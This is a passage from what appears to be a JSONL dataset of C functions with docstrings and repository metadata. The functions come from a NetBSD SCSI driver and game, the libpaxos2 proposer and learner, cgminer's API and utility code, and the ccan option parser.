~DRIVER_IN_DMA;\n\n\t\t/*\n\t\t * Clear mode and icom\n\t\t */\n\t\tSET_5380_REG(NCR5380_MODE, IMODE_BASE);\n\t\tSET_5380_REG(NCR5380_ICOM, 0);\n\n\t\tif (dmstat & SC_BSY_ERR) {\n\t\t\tif (!reqp->xs->error)\n\t\t\t\treqp->xs->error = XS_TIMEOUT;\n\t\t\tfinish_req(reqp);\n\t\t\tPID(\"dma_ready1\");\n\t\t\treturn (1);\n\t\t}\n\n\t\tif (reqp->xs->error != 0) {\nncr_tprint(reqp, \"dma-ready: code = %d\\n\", reqp->xs->error); /* LWP */\n\t\t\treqp->msgout = MSG_ABORT;\n\t\t\tSET_5380_REG(NCR5380_ICOM, SC_A_ATN);\n\t\t}\n\t\tPID(\"dma_ready2\");\n\t\treturn (1);\n\t}\n\treturn (0);\n}", "path": "netbsdsrc\\sys\\arch\\atari\\dev\\ncr5380.c", "repo_name": "sghiassy/Code-Reading-Book", "stars": 49, "license": "None", "language": "c", "size": 113852}
{"docstring": "/*\n *\tCheck to see if more games are desired.  If not, and game\n * came from a saved file, make sure that they don't want to restore\n * it.  Exit appropriately.\n */\n", "func_signal": "void\ncheck_more()", "code": "{\n\tOn_exit = TRUE;\n\tif (Player[PLAYER].total >= 5000 || Player[COMP].total >= 5000)\n\t\tif (getyn(ANOTHERGAMEPROMPT))\n\t\t\treturn;\n\t\telse {\n\t\t\t/*\n\t\t\t * must do accounting normally done in main()\n\t\t\t */\n\t\t\tif (Player[PLAYER].total > Player[COMP].total)\n\t\t\t\tPlayer[PLAYER].games++;\n\t\t\telse if (Player[PLAYER].total < Player[COMP].total)\n\t\t\t\tPlayer[COMP].games++;\n\t\t\tPlayer[COMP].total = 0;\n\t\t\tPlayer[PLAYER].total = 0;\n\t\t}\n\telse\n\t\tif (getyn(ANOTHERHANDPROMPT))\n\t\t\treturn;\n\tif (!Saved && getyn(SAVEGAMEPROMPT))\n\t\tif (!save())\n\t\t\treturn;\n\tdie(0);\n}", "path": "netbsdsrc\\games\\mille\\misc.c", "repo_name": "sghiassy/Code-Reading-Book", "stars": 49, "license": "None", "language": "c", "size": 113852}
{"docstring": "//Initialize structures\n", "func_signal": "static int \ninit_pro_structs()", "code": "{\n    //Check array size\n    if ((PROPOSER_ARRAY_SIZE & (PROPOSER_ARRAY_SIZE -1)) != 0) {\n        printf(\"Error: PROPOSER_ARRAY_SIZE is not a power of 2\\n\");\n        return PROPOSER_ERROR;        \n    }\n    if (PROPOSER_ARRAY_SIZE <= PROPOSER_PREEXEC_WIN_SIZE) {\n        printf(\"Error: PROPOSER_ARRAY_SIZE = %d is too small\\n\",\n            PROPOSER_ARRAY_SIZE);\n        return PROPOSER_ERROR;\n    }\n    \n    // Clear the state array\n    memset(proposer_state, 0, (sizeof(p_inst_info) * PROPOSER_ARRAY_SIZE));\n    size_t i;\n    for(i = 0; i < PROPOSER_ARRAY_SIZE; i++) {\n        pro_clear_instance_info(&proposer_state[i]);\n    }\n    return 0;\n\n}", "path": "lib\\proposer.c", "repo_name": "tnm/libpaxos2", "stars": 35, "license": "None", "language": "c", "size": 202}
{"docstring": "//Set up the first event to be executed ASAP, \n// signaling that the initialization is complete\n", "func_signal": "static int\ninit_lea_signal_ready()", "code": "{\n    evtimer_set(&init_complete_event, init_lea_success, NULL);\n\tif(event_add(&init_complete_event, &asap_interval) != 0) {\n\t   printf(\"Error while adding lea successful init event\\n\");\n       return -1;\n   }\n   return 0;\n}", "path": "lib\\learner.c", "repo_name": "tnm/libpaxos2", "stars": 35, "license": "None", "language": "c", "size": 202}
{"docstring": "//This function is invoked when a new message is ready to be read\n// from the proposer UDP socket\n", "func_signal": "static void \npro_handle_newmsg(int sock, short event, void *arg)", "code": "{\n    //Make the compiler happy!\n    UNUSED_ARG(sock);\n    UNUSED_ARG(event);\n    UNUSED_ARG(arg);\n    \n    assert(sock == for_proposer->sock);\n    \n    //Read the next message\n    int valid = udp_read_next_message(for_proposer);\n    if (valid < 0) {\n        printf(\"Dropping invalid proposer message\\n\");\n        return;\n    }\n\n    //The message is valid, take the appropriate action\n    // based on the type\n    paxos_msg * msg = (paxos_msg*) &for_proposer->recv_buffer;\n    switch(msg->type) {\n        case prepare_acks: {\n            handle_prepare_ack_batch((prepare_ack_batch*) msg->data);\n        }\n        break;\n\n        default: {\n            printf(\"Unknow msg type %d received from acceptors\\n\", msg->type);\n        }\n    }\n}", "path": "lib\\proposer.c", "repo_name": "tnm/libpaxos2", "stars": 35, "license": "None", "language": "c", "size": 202}
{"docstring": "// Called when an accept_ack is received, the learner will update it's status\n// for that instance and afterward check if the instance is closed\n", "func_signal": "static void handle_accept_ack(short int acceptor_id, accept_ack * aa)", "code": "{\n    //Keep track of highest seen instance id\n    if(aa->iid > highest_iid_seen) {\n        highest_iid_seen = aa->iid;\n    }\n    \n    //Already closed and delivered, ignore message\n    if(aa->iid < current_iid) {\n        LOG(DBG, (\"Dropping accept_ack for already delivered iid:%lu\\n\", aa->iid));\n        return;\n    }\n    \n    //We are late w.r.t the current iid, ignore message\n    // (The instence received is too ahead and will overwrite something)\n    if(aa->iid >= current_iid + LEARNER_ARRAY_SIZE) {\n        LOG(DBG, (\"Dropping accept_ack for iid:%lu, too far in future\\n\", aa->iid));\n        return;\n    }\n\n    //Message is within interesting bounds\n    //Update the corresponding record\n    l_inst_info * ii = GET_LEA_INSTANCE(aa->iid);\n    int relevant = lea_update_state(ii, acceptor_id, aa);\n    if(!relevant) {\n        //Not really interesting (i.e. a duplicate message)\n        LOG(DBG, (\"Learner discarding learn for iid:%lu\\n\", aa->iid));\n        return;\n    }\n    \n    // Message contained some relevant info, \n    // check if instance can be declared closed\n    int closed = lea_check_quorum(ii);\n    if(!closed) {\n        LOG(DBG, (\"Not yet a quorum for iid:%lu\\n\", aa->iid));\n        return;\n    }\n\n    //If the closed instance is the current one,\n    //Deliver it (and the followings if already closed)\n    if (aa->iid == current_iid) {\n        lea_deliver_next_closed(aa->iid);\n    }\n}", "path": "lib\\learner.c", "repo_name": "tnm/libpaxos2", "stars": 35, "license": "None", "language": "c", "size": 202}
{"docstring": "//Checks if a given instance is closed, that is if a quorum of acceptor\n// accepted the same value+ballot\n//Returns 1 if the instance is closed, 0 otherwise\n", "func_signal": "static int lea_check_quorum(l_inst_info * ii)", "code": "{\n    size_t i, a_valid_index = -1, count = 0;\n    accept_ack * curr_ack;\n    \n    //Iterates over stored acks\n    for(i = 0; i < N_OF_ACCEPTORS; i++) {\n        curr_ack = ii->acks[i];\n        \n        //No ack from this acceptor, skip\n        if(curr_ack == NULL) {\n            continue;\n        }\n        \n        //Count the ones \"agreeing\" with the last added\n        if(curr_ack->ballot == ii->last_update_ballot){\n            a_valid_index = i;\n            count++;\n            \n            //Special case: an acceptor is telling that\n            //this value is -final-, it can be delivered \n            // immediately.\n            if(curr_ack->is_final) {\n                //For sure >= than quorum...\n                count += N_OF_ACCEPTORS;\n                break;\n            }\n        }\n    }\n    \n    //Reached a quorum/majority!\n    if(count >= QUORUM) {\n        LOG(DBG, (\"Reached quorum, iid:%lu is closed!\\n\", ii->iid));\n        ii->final_value = ii->acks[a_valid_index];\n        \n        //Keep track of highest closed\n        if(ii->iid > highest_iid_closed) {\n            highest_iid_closed = ii->iid;\n        }\n\n        return 1;\n    }\n    \n    //No quorum yet...\n    return 0;\n\n}", "path": "lib\\learner.c", "repo_name": "tnm/libpaxos2", "stars": 35, "license": "None", "language": "c", "size": 202}
{"docstring": "//Invoked when learner init fails. Sets the state to error and \n// wakes up the thread that called learner_init\n", "func_signal": "static void \ninit_lea_failure(char * msg)", "code": "{\n    //Init failed for some reason\n    printf(\"Learner init error: %s\\n\", msg);\n    \n    //Set status to error and wake up \n    //the thread that called learner_init\n    pthread_mutex_lock(&ready_lock);\n    learner_ready = LEARNER_ERROR;\n    pthread_cond_signal(&ready_cond);\n    pthread_mutex_unlock(&ready_lock);\n}", "path": "lib\\learner.c", "repo_name": "tnm/libpaxos2", "stars": 35, "license": "None", "language": "c", "size": 202}
{"docstring": "// Called when an accept_ack_batch is received\n", "func_signal": "static void handle_accept_ack_batch(accept_ack_batch* aab)", "code": "{\n    size_t data_offset;\n    accept_ack * aa;\n    \n    data_offset = 0;\n\n    short int i;\n    //Iterate over accept_ack messages in batch\n    for(i = 0; i < aab->count; i++) {\n        aa = (accept_ack*) &aab->data[data_offset];\n        handle_accept_ack(aab->acceptor_id, aa);\n        data_offset += ACCEPT_ACK_SIZE(aa);\n    }    \n}", "path": "lib\\learner.c", "repo_name": "tnm/libpaxos2", "stars": 35, "license": "None", "language": "c", "size": 202}
{"docstring": "/*-------------------------------------------------------------------------*/\n// Public functions (see libpaxos.h for more details)\n/*-------------------------------------------------------------------------*/\n", "func_signal": "int learner_init(deliver_function f, custom_init_function cif)", "code": "{\n    // Start learner (which starts event_dispatch())\n    custom_init = cif;\n    if (pthread_create(&learner_thread, NULL, init_learner_thread, (void*) f) != 0) {\n        perror(\"pthread create learner thread\");\n        return -1;\n    }\n    \n    //Wait until initialization completed\n    LOG(DBG, (\"Learner thread started, waiting for ready signal\\n\"));    \n    if (init_lea_wait_ready() == LEARNER_ERROR) {\n        printf(\"Learner initialization failed!\\n\");\n        return -1;\n    }\n    \n    LOG(VRB, (\"Learner is ready\\n\"));    \n    return 0;\n}", "path": "lib\\learner.c", "repo_name": "tnm/libpaxos2", "stars": 35, "license": "None", "language": "c", "size": 202}
{"docstring": "/*-------------------------------------------------------------------------*/\n// Initialization\n/*-------------------------------------------------------------------------*/\n//Initialize sockets and related events\n", "func_signal": "static int \ninit_pro_network()", "code": "{\n    \n    // Send buffer for talking to acceptors\n    to_acceptors = udp_sendbuf_new(PAXOS_ACCEPTORS_NET);\n    if(to_acceptors == NULL) {\n        printf(\"Error creating proposer->acceptors network sender\\n\");\n        return PROPOSER_ERROR;\n    }\n    \n    // Message receive event\n    for_proposer = udp_receiver_new(PAXOS_PROPOSERS_NET);\n    if (for_proposer == NULL) {\n        printf(\"Error creating proposer network receiver\\n\");\n        return PROPOSER_ERROR;\n    }\n    event_set(&proposer_msg_event, for_proposer->sock, EV_READ|EV_PERSIST, pro_handle_newmsg, NULL);\n    event_add(&proposer_msg_event, NULL);\n    \n    return 0;\n}", "path": "lib\\proposer.c", "repo_name": "tnm/libpaxos2", "stars": 35, "license": "None", "language": "c", "size": 202}
{"docstring": "//TODO: comment or categorize...\n", "func_signal": "void learner_suspend()", "code": "{\n    //Remove active events\n    event_del(&learner_msg_event);\n    //Close socket\n    udp_receiver_destroy(for_learner);\n    for_learner = NULL;\n        \n    LOG(VRB, (\"Learner events suspended!\\n\"));\n}", "path": "lib\\learner.c", "repo_name": "tnm/libpaxos2", "stars": 35, "license": "None", "language": "c", "size": 202}
{"docstring": "//Proposer initialization, this function is invoked by\n// the underlying learner after it's normal initialization\n", "func_signal": "static int init_proposer()", "code": "{\n    \n    //Add network events and prepare send buffer\n    if(init_pro_network() != 0) {\n        printf(\"Proposer network init failed\\n\");\n        return -1;\n    }\n\n    //Add additional timers to libevent loop\n    if(init_pro_fd_events() != 0){\n        printf(\"Proposer timers init failed\\n\");\n        return -1;\n    }\n    \n    //Normal proposer initialization, private structures\n    if(init_pro_structs() != 0) {\n        printf(\"Proposer structs init failed\\n\");\n        return -1;\n    }\n        \n    //By default, proposer 0 starts as leader, \n    // later on the failure detector may change that\n    if(LEADER_IS_ME) {\n        if(leader_init() != 0) {\n            printf(\"Proposer Leader init failed\\n\");\n            return -1;\n        }\n    }\n    \n    //Call custom init (i.e. to register additional events)\n    if(client_custom_init != NULL && client_custom_init() != 0) {\n        printf(\"Error in client_custom_init\\n\");\n        return -1;\n    } else {\n        LOG(DBG, (\"Custom init completed\\n\"));\n    }\n\n    return 0;\n}", "path": "lib\\proposer.c", "repo_name": "tnm/libpaxos2", "stars": 35, "license": "None", "language": "c", "size": 202}
{"docstring": "// This function waits until the learner status is set \n// (to 'ready' or to 'error') and returns the corresponding value\n", "func_signal": "static int \ninit_lea_wait_ready()", "code": "{\n    int status;\n    \n    pthread_mutex_lock(&ready_lock);\n    \n    while(1) {\n        //Wait for a signal\n        pthread_cond_wait(&ready_cond, &ready_lock);\n        status = learner_ready;\n\n        if(status == LEARNER_STARTING) {\n        //Not ready yet, keep waiting\n            continue;            \n        } else {\n        //Status changed\n            break;\n        }\n    }\n    \n    //Check that status is a valid value\n    if (status != LEARNER_READY && status != LEARNER_ERROR) {\n        printf(\"Unknow learner status: %d\\n\", status);\n        status = LEARNER_ERROR;\n    }\n    \n    pthread_mutex_unlock(&ready_lock);\n    return status;\n}", "path": "lib\\learner.c", "repo_name": "tnm/libpaxos2", "stars": 35, "license": "None", "language": "c", "size": 202}
{"docstring": "//Returns 1 if the instance became ready, 0 otherwise\n", "func_signal": "static int\nhandle_prepare_ack(prepare_ack * pa, short int acceptor_id)", "code": "{\n    p_inst_info * ii = GET_PRO_INSTANCE(pa->iid);\n    // If not p1_pending, drop\n    if(ii->status != p1_pending) {\n        LOG(DBG, (\"Promise dropped, iid:%ld not pending\\n\", pa->iid));\n        return 0;\n    }\n    \n    // If not our ballot, drop\n    if(pa->ballot != ii->my_ballot) {\n        LOG(DBG, (\"Promise dropped, iid:%ld not our ballot\\n\", pa->iid));\n        return 0;\n    }\n    \n    //Save the acknowledgement from this acceptor\n    //Takes also care of value that may be there\n    pro_save_prepare_ack(ii, pa, acceptor_id);\n    \n    //Not a majority yet for this instance\n    if(ii->promises_count < QUORUM) {\n        LOG(DBG, (\"Not yet a quorum for iid:%ld\\n\", pa->iid));\n        return 0;\n    }\n    \n    //Quorum reached!\n    ii->status = p1_ready;\n    p1_info.pending_count -= 1;\n    p1_info.ready_count += 1;\n\n    LOG(DBG, (\"Quorum for iid:%ld reached\\n\", pa->iid));\n    \n    return 1;\n}", "path": "lib\\proposer.c", "repo_name": "tnm/libpaxos2", "stars": 35, "license": "None", "language": "c", "size": 202}
{"docstring": "//Tries to update the state based on the accept_ack received.\n//Returns 0 if the message was discarded because not relevant. 1 if the state changed.\n", "func_signal": "static int lea_update_state(l_inst_info * ii, short int acceptor_id, accept_ack * aa)", "code": "{\n    //First message for this iid\n    if(ii->iid == INST_INFO_EMPTY) {\n        LOG(DBG, (\"Received first message for instance:%lu\\n\", aa->iid));\n        ii->iid = aa->iid;\n        ii->last_update_ballot = aa->ballot;\n    }\n    assert(ii->iid == aa->iid);\n    \n    //Instance closed already, drop\n    if(IS_CLOSED(ii)) {\n        LOG(DBG, (\"Dropping accept_ack for iid:%lu, already closed\\n\", aa->iid));\n        return 0;\n    }\n    \n    //No previous message to overwrite for this acceptor\n    if(ii->acks[acceptor_id] == NULL) {\n        LOG(DBG, (\"Got first ack for iid:%lu, acceptor:%d\\n\", \\\n            ii->iid, acceptor_id));\n        //Save this accept_ack\n        lea_store_accept_ack(ii, acceptor_id, aa);\n        ii->last_update_ballot = aa->ballot;\n        return 1;\n    }\n    \n    //There is already a message from the same acceptor\n    accept_ack * prev_ack = ii->acks[acceptor_id];\n    \n    //Already more recent info in the record, accept_ack is old\n    if(prev_ack->ballot >= aa->ballot) {\n        LOG(DBG, (\"Dropping accept_ack for iid:%lu, stored ballot is newer or equal\\n\", aa->iid));\n        return 0;\n    }\n    \n    //Replace the previous ack since the received ballot is newer\n    LOG(DBG, (\"Overwriting previous accept_ack for iid:%lu\\n\", aa->iid));\n    PAX_FREE(prev_ack);\n    lea_store_accept_ack(ii, acceptor_id, aa);\n    ii->last_update_ballot = aa->ballot;\n    return 1;\n}", "path": "lib\\learner.c", "repo_name": "tnm/libpaxos2", "stars": 35, "license": "None", "language": "c", "size": 202}
{"docstring": "//Invoked as first event of libevent loop, if learner init \n// completes successfully. Sets the state to ready\n//  and wakes up the thread that called learner_init\n", "func_signal": "static void\ninit_lea_success(int fd, short event, void *arg)", "code": "{\n    UNUSED_ARG(fd);\n    UNUSED_ARG(event);\n    UNUSED_ARG(arg);\n\n    LOG(DBG, (\"Learner thread setting status to ready\\n\"));\n    //Init completed successfully, wake up\n    //the thread that called learner_init\n    pthread_mutex_lock(&ready_lock);\n    learner_ready = LEARNER_READY;\n    pthread_cond_signal(&ready_cond);\n    pthread_mutex_unlock(&ready_lock);\n}", "path": "lib\\learner.c", "repo_name": "tnm/libpaxos2", "stars": 35, "license": "None", "language": "c", "size": 202}
{"docstring": "//This function is invoked periodically and tries to detect if the learner \n// missed some message. For example if instance I is closed but instance I-1 \n// it's not, we can't deliver I. So it will ask to the acceptors to repeat \n// their accepted value\n", "func_signal": "static void\nlea_hole_check(int fd, short event, void *arg)", "code": "{\n    UNUSED_ARG(fd);\n    UNUSED_ARG(event);\n    UNUSED_ARG(arg);\n\n    //Periodic check for missing instances\n    //(i.e. i+1 closed, but i not closed yet)\n    if (highest_iid_seen > current_iid + LEARNER_ARRAY_SIZE) {\n        LOG(0, (\"This learner is lagging behind!!!, highest seen:%lu, highest delivered:%lu\\n\", \n            highest_iid_seen, current_iid-1));\n        lea_send_repeat_request(current_iid, highest_iid_seen);\n    } else if(highest_iid_closed > current_iid) {\n        LOG(VRB, (\"Out of sync, highest closed:%lu, highest delivered:%lu\\n\", \n            highest_iid_closed, current_iid-1));\n        //Ask retransmission to acceptors\n        lea_send_repeat_request(current_iid, highest_iid_closed);\n    }\n\n    //Set the next timeout for calling this function\n    if(event_add(&hole_check_event, &hole_check_interval) != 0) {\n\t   printf(\"Error while adding next hole_check event\\n\");\n\t}\n}", "path": "lib\\learner.c", "repo_name": "tnm/libpaxos2", "stars": 35, "license": "None", "language": "c", "size": 202}
{"docstring": "//Resets a given instance info\n", "func_signal": "static void lea_clear_instance_info(l_inst_info * ii)", "code": "{\n    //Reset all fields and free stored messages\n    ii->iid = INST_INFO_EMPTY;\n    ii->last_update_ballot = 0;\n    ii->final_value = NULL;\n    size_t i;\n    //Free all stored accept_ack\n    for(i = 0; i < N_OF_ACCEPTORS; i++) {\n        if(ii->acks[i] != NULL) {\n            PAX_FREE(ii->acks[i]);\n            ii->acks[i] = NULL;            \n        }\n    }\n}", "path": "lib\\learner.c", "repo_name": "tnm/libpaxos2", "stars": 35, "license": "None", "language": "c", "size": 202}
{"docstring": "/*-------------------------------------------------------------------------*/\n// Helpers\n/*-------------------------------------------------------------------------*/\n", "func_signal": "static void\npro_clear_instance_info(p_inst_info * ii)", "code": "{\n    ii->iid = 0;\n    ii->status = empty;\n    ii->my_ballot = 0;\n    ii->p1_value_ballot = 0;\n    ii->promises_bitvector = 0;\n    ii->promises_count = 0;\n    if(ii->p1_value != NULL) {\n        PAX_FREE(ii->p1_value);\n    }\n    ii->p1_value = NULL;\n    if(ii->p2_value != NULL) {\n        PAX_FREE(ii->p2_value);\n    }\n    ii->p2_value = NULL;\n}", "path": "lib\\proposer.c", "repo_name": "tnm/libpaxos2", "stars": 35, "license": "None", "language": "c", "size": 202}
{"docstring": "//Initializes socket managers and relative events\n", "func_signal": "static int init_lea_network()", "code": "{\n    \n    // Send buffer for talking to acceptors\n    to_acceptors = udp_sendbuf_new(PAXOS_ACCEPTORS_NET);\n    if(to_acceptors == NULL) {\n        printf(\"Error creating learner network sender\\n\");\n        return LEARNER_ERROR;\n    }\n    \n    // Message receive event\n    for_learner = udp_receiver_new(PAXOS_LEARNERS_NET);\n    if (for_learner == NULL) {\n        printf(\"Error creating learner network receiver\\n\");\n        return LEARNER_ERROR;\n    }\n    event_set(&learner_msg_event, for_learner->sock, EV_READ|EV_PERSIST, lea_handle_newmsg, NULL);\n    event_add(&learner_msg_event, NULL);\n    \n    return 0;\n}", "path": "lib\\learner.c", "repo_name": "tnm/libpaxos2", "stars": 35, "license": "None", "language": "c", "size": 202}
{"docstring": "//Initialize timers\n", "func_signal": "static int \ninit_pro_fd_events()", "code": "{\n    \n    // Send buffer for sending alive pings\n    to_oracle = udp_sendbuf_new(PAXOS_PINGS_NET);\n    if(to_oracle == NULL) {\n        printf(\"Error creating proposer->oracle network sender\\n\");\n        return PROPOSER_ERROR;\n    }\n    \n    // Message receive event (from oracle)\n    from_oracle = udp_receiver_new(PAXOS_ORACLE_NET);\n    if (from_oracle == NULL) {\n        printf(\"Error creating oracle->proposer network receiver\\n\");\n        return PROPOSER_ERROR;\n    }\n    event_set(&oracle_msg_event, from_oracle->sock, EV_READ|EV_PERSIST, pro_handle_oracle_msg, NULL);\n    event_add(&oracle_msg_event, NULL);\n\n    //Set timer for sending alive pings\n    evtimer_set(&fe_ping_event, pro_ping_failure_detector, NULL);\n    evutil_timerclear(&fe_ping_interval);\n    fe_ping_interval.tv_sec = (FAILURE_DETECTOR_PING_INTERVAL / 1000000);\n    fe_ping_interval.tv_usec = (FAILURE_DETECTOR_PING_INTERVAL % 1000000);\n\n    //Send the first alive ping\n    pro_ping_failure_detector(0, 0, NULL);\n    \n    return 0;\n}", "path": "lib\\proposer.c", "repo_name": "tnm/libpaxos2", "stars": 35, "license": "None", "language": "c", "size": 202}
{"docstring": "// This is only called when expected to be needed (rarely)\n// i.e. strings outside of the codes control (input from the user)\n", "func_signal": "static char *escape_string(char *str, bool isjson)", "code": "{\n\tchar *buf, *ptr;\n\tint count;\n\n\tcount = 0;\n\tfor (ptr = str; *ptr; ptr++) {\n\t\tswitch (*ptr) {\n\t\t\tcase ',':\n\t\t\tcase '|':\n\t\t\tcase '=':\n\t\t\t\tif (!isjson)\n\t\t\t\t\tcount++;\n\t\t\t\tbreak;\n\t\t\tcase '\"':\n\t\t\t\tif (isjson)\n\t\t\t\t\tcount++;\n\t\t\t\tbreak;\n\t\t\tcase '\\\\':\n\t\t\t\tcount++;\n\t\t\t\tbreak;\n\t\t}\n\t}\n\n\tif (count == 0)\n\t\treturn str;\n\n\tbuf = malloc(strlen(str) + count + 1);\n\tif (unlikely(!buf))\n\t\tquit(1, \"Failed to malloc escape buf\");\n\n\tptr = buf;\n\twhile (*str)\n\t\tswitch (*str) {\n\t\t\tcase ',':\n\t\t\tcase '|':\n\t\t\tcase '=':\n\t\t\t\tif (!isjson)\n\t\t\t\t\t*(ptr++) = '\\\\';\n\t\t\t\t*(ptr++) = *(str++);\n\t\t\t\tbreak;\n\t\t\tcase '\"':\n\t\t\t\tif (isjson)\n\t\t\t\t\t*(ptr++) = '\\\\';\n\t\t\t\t*(ptr++) = *(str++);\n\t\t\t\tbreak;\n\t\t\tcase '\\\\':\n\t\t\t\t*(ptr++) = '\\\\';\n\t\t\t\t*(ptr++) = *(str++);\n\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\t*(ptr++) = *(str++);\n\t\t\t\tbreak;\n\t\t}\n\n\t*ptr = '\\0';\n\n\treturn buf;\n}", "path": "api.c", "repo_name": "Kalroth/cgminer-3.7.2-kalroth", "stars": 56, "license": "other", "language": "c", "size": 13879}
{"docstring": "// All replies (except BYE and RESTART) start with a message\n//  thus for JSON, message() inserts JSON_START at the front\n//  and send_result() adds JSON_END at the end\n", "func_signal": "static void message(struct io_data *io_data, int messageid, int paramid, char *param2, bool isjson)", "code": "{\n\tstruct api_data *root = NULL;\n\tchar buf[TMPBUFSIZ];\n\tchar buf2[TMPBUFSIZ];\n\tchar severity[2];\n#ifdef HAVE_AN_ASIC\n\tint asc;\n#endif\n#ifdef HAVE_AN_FPGA\n\tint pga;\n#endif\n\tint i;\n\n\tio_reinit(io_data);\n\n\tif (isjson)\n\t\tio_put(io_data, JSON_START JSON_STATUS);\n\n\tfor (i = 0; codes[i].severity != SEVERITY_FAIL; i++) {\n\t\tif (codes[i].code == messageid) {\n\t\t\tswitch (codes[i].severity) {\n\t\t\t\tcase SEVERITY_WARN:\n\t\t\t\t\tseverity[0] = 'W';\n\t\t\t\t\tbreak;\n\t\t\t\tcase SEVERITY_INFO:\n\t\t\t\t\tseverity[0] = 'I';\n\t\t\t\t\tbreak;\n\t\t\t\tcase SEVERITY_SUCC:\n\t\t\t\t\tseverity[0] = 'S';\n\t\t\t\t\tbreak;\n\t\t\t\tcase SEVERITY_ERR:\n\t\t\t\tdefault:\n\t\t\t\t\tseverity[0] = 'E';\n\t\t\t\t\tbreak;\n\t\t\t}\n\t\t\tseverity[1] = '\\0';\n\n\t\t\tswitch(codes[i].params) {\n\t\t\t\tcase PARAM_GPU:\n\t\t\t\tcase PARAM_PGA:\n\t\t\t\tcase PARAM_ASC:\n\t\t\t\tcase PARAM_PID:\n\t\t\t\tcase PARAM_INT:\n\t\t\t\t\tsprintf(buf, codes[i].description, paramid);\n\t\t\t\t\tbreak;\n\t\t\t\tcase PARAM_POOL:\n\t\t\t\t\tsprintf(buf, codes[i].description, paramid, pools[paramid]->rpc_url);\n\t\t\t\t\tbreak;\n#ifdef HAVE_OPENCL\n\t\t\t\tcase PARAM_GPUMAX:\n\t\t\t\t\tsprintf(buf, codes[i].description, paramid, nDevs - 1);\n\t\t\t\t\tbreak;\n#endif\n#ifdef HAVE_AN_FPGA\n\t\t\t\tcase PARAM_PGAMAX:\n\t\t\t\t\tpga = numpgas();\n\t\t\t\t\tsprintf(buf, codes[i].description, paramid, pga - 1);\n\t\t\t\t\tbreak;\n#endif\n#ifdef HAVE_AN_ASIC\n\t\t\t\tcase PARAM_ASCMAX:\n\t\t\t\t\tasc = numascs();\n\t\t\t\t\tsprintf(buf, codes[i].description, paramid, asc - 1);\n\t\t\t\t\tbreak;\n#endif\n\t\t\t\tcase PARAM_PMAX:\n\t\t\t\t\tsprintf(buf, codes[i].description, total_pools);\n\t\t\t\t\tbreak;\n\t\t\t\tcase PARAM_POOLMAX:\n\t\t\t\t\tsprintf(buf, codes[i].description, paramid, total_pools - 1);\n\t\t\t\t\tbreak;\n\t\t\t\tcase PARAM_DMAX:\n#ifdef HAVE_AN_ASIC\n\t\t\t\t\tasc = numascs();\n#endif\n#ifdef HAVE_AN_FPGA\n\t\t\t\t\tpga = numpgas();\n#endif\n\n\t\t\t\t\tsprintf(buf, codes[i].description\n#ifdef HAVE_OPENCL\n\t\t\t\t\t\t, nDevs\n#endif\n#ifdef HAVE_AN_ASIC\n\t\t\t\t\t\t, asc\n#endif\n#ifdef HAVE_AN_FPGA\n\t\t\t\t\t\t, pga\n#endif\n\t\t\t\t\t\t);\n\t\t\t\t\tbreak;\n\t\t\t\tcase PARAM_CMD:\n\t\t\t\t\tsprintf(buf, codes[i].description, JSON_COMMAND);\n\t\t\t\t\tbreak;\n\t\t\t\tcase PARAM_STR:\n\t\t\t\t\tsprintf(buf, codes[i].description, param2);\n\t\t\t\t\tbreak;\n\t\t\t\tcase PARAM_BOTH:\n\t\t\t\t\tsprintf(buf, codes[i].description, paramid, param2);\n\t\t\t\t\tbreak;\n\t\t\t\tcase PARAM_BOOL:\n\t\t\t\t\tsprintf(buf, codes[i].description, paramid ? TRUESTR : FALSESTR);\n\t\t\t\t\tbreak;\n\t\t\t\tcase PARAM_SET:\n\t\t\t\t\tsprintf(buf, codes[i].description, param2, paramid);\n\t\t\t\t\tbreak;\n\t\t\t\tcase PARAM_NONE:\n\t\t\t\tdefault:\n\t\t\t\t\tstrcpy(buf, codes[i].description);\n\t\t\t}\n\n\t\t\troot = api_add_string(root, _STATUS, severity, false);\n\t\t\troot = api_add_time(root, \"When\", &when, false);\n\t\t\troot = api_add_int(root, \"Code\", &messageid, false);\n\t\t\troot = api_add_escape(root, \"Msg\", buf, false);\n\t\t\troot = api_add_escape(root, \"Description\", opt_api_description, false);\n\n\t\t\troot = print_data(root, buf2, isjson, false);\n\t\t\tio_add(io_data, buf2);\n\t\t\tif (isjson)\n\t\t\t\tio_add(io_data, JSON_CLOSE);\n\t\t\treturn;\n\t\t}\n\t}\n\n\troot = api_add_string(root, _STATUS, \"F\", false);\n\troot = api_add_time(root, \"When\", &when, false);\n\tint id = -1;\n\troot = api_add_int(root, \"Code\", &id, false);\n\tsprintf(buf, \"%d\", messageid);\n\troot = api_add_escape(root, \"Msg\", buf, false);\n\troot = api_add_escape(root, \"Description\", opt_api_description, false);\n\n\troot = print_data(root, buf2, isjson, false);\n\tio_add(io_data, buf2);\n\tif (isjson)\n\t\tio_add(io_data, JSON_CLOSE);\n}", "path": "api.c", "repo_name": "Kalroth/cgminer-3.7.2-kalroth", "stars": 56, "license": "other", "language": "c", "size": 13879}
{"docstring": "/* Realloc an existing string to fit an extra string s, appending s to it. */\n", "func_signal": "void *realloc_strcat(char *ptr, char *s)", "code": "{\n\tsize_t old = strlen(ptr), len = strlen(s);\n\tchar *ret;\n\n\tif (!len)\n\t\treturn ptr;\n\n\tlen += old + 1;\n\talign_len(&len);\n\n\tret = malloc(len);\n\tif (unlikely(!ret))\n\t\tquithere(1, \"Failed to malloc\");\n\n\tsprintf(ret, \"%s%s\", ptr, s);\n\tfree(ptr);\n\treturn ret;\n}", "path": "util.c", "repo_name": "Kalroth/cgminer-3.7.2-kalroth", "stars": 56, "license": "other", "language": "c", "size": 13879}
{"docstring": "/* Parse your arguments. */\n", "func_signal": "bool opt_parse(int *argc, char *argv[], void (*errlog)(const char *fmt, ...))", "code": "{\n\tint ret;\n\tunsigned offset = 0;\n\t\n\t#ifdef WIN32\n\tchar *original_argv0 = argv[0];\n\targv[0] = (char*)basename(argv[0]);\n\t#endif\n\n\t/* This helps opt_usage. */\n\topt_argv0 = argv[0];\n\n\twhile ((ret = parse_one(argc, argv, &offset, errlog)) == 1);\n\t\n\t#ifdef WIN32\n\targv[0] = original_argv0;\n\t#endif\n\n\t/* parse_one returns 0 on finish, -1 on error */\n\treturn (ret == 0);\n}", "path": "ccan\\opt\\opt.c", "repo_name": "Kalroth/cgminer-3.7.2-kalroth", "stars": 56, "license": "other", "language": "c", "size": 13879}
